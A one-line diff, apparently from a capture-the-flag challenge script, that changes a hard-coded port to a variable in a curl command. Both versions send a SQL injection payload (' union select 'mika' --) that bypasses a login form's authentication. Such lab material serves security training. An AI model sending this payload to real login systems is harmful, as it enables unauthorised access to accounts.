@@ -1,1 +1,1 @@
-curl "http://${CHALLENGE_HOST}:8002/" -d "username=' union select 'mika' --&password=x"
+curl "http://${CHALLENGE_HOST}:${CHALLENGE_PORT}/" -d "username=' union select 'mika' --&password=x"
